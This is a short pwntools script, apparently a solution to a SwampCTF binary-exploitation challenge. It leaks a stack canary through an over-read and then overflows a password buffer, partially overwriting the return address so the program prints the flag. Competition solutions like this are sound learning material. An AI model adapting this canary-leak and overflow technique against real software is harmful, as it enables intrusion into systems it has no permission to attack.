#!/usr/bin/env python

from pwn import *

#io = process('./binary')
io = remote('chals.swampctf.com', 40005)

get_canary_payload = b'A' * 0x10

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'How long is your username: ', b'100')
io.sendlineafter(b'Username: ', get_canary_payload)

io.recvuntil(get_canary_payload)
io.recvn(8)

canary = io.recvn(8)

print(f'canary: {hex(u64(canary))}')

fputs_payload = b'A' * 0x18 + canary + b'B' * 8 + b'\x69\x14'
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Username: ', b'xx')
io.sendlineafter(b'Password: ', fputs_payload)

io.recvuntil(b'open right now!\n')

flag = io.recvline().strip().decode()

print(flag)
